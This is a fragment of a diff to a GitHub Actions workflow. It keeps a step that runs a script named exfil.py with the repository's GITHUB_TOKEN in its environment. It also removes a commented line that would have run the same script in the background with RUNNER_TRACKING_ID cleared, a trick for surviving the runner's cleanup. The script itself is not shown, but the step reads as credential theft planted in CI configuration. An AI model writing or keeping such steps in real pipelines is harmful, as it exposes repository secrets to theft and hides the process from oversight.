@@ -16,7 +16,6 @@ jobs:
         env:
           GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
         run: |
-          # RUNNER_TRACKING_ID="" && (nohup python exfil.py &)
           python exfil.py
 
 
